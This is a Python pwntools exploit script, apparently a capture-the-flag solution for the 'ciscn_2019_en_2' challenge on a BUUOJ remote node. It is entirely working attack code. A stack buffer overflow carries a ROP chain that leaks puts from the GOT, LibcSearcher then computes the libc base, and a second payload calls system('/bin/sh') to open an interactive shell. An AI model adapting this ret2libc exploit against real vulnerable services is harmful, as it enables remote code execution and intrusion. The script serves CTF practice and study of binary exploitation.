#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 0
os_level = 64
binary_name = 'ciscn_2019_en_2'
remote_addr = 'node5.buuoj.cn'
port = 28466

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF(libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
show = lambda x:log.success(x)
slp = lambda x:sleep(x)

#Main function
if __name__ == '__main__':
    #you can add your code here
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    main_addr = elf.symbols['main']
    prdi = 0x0000000000400c83
    ret = 0x00000000004006b9
    sla(b'choice!',b'1')
    payload = b'\x00'*0x50 + b'b'*0x8 + p64(prdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
    sla(b'encrypted',payload)
    ru(b'Ciphertext\n')
    rl()
    puts_addr = u64(rc(6).ljust(8, b'\x00'))
    show(b'puts@libc--> ' + bytes(hex(puts_addr),encoding='utf-8'))
    libc = LibcSearcher('puts',puts_addr)
    libc_base = puts_addr - libc.dump('puts')
    system_addr = libc_base + libc.dump('system')
    bin_sh_addr = libc_base + libc.dump('str_bin_sh')
    sla(b'choice!',b'1')
    payload = b'\x00'*0x50 + b'b'*0x8 + p64(prdi) + p64(bin_sh_addr) + p64(ret) + p64(system_addr)
    sla(b'encrypted',payload)
    p.interactive()
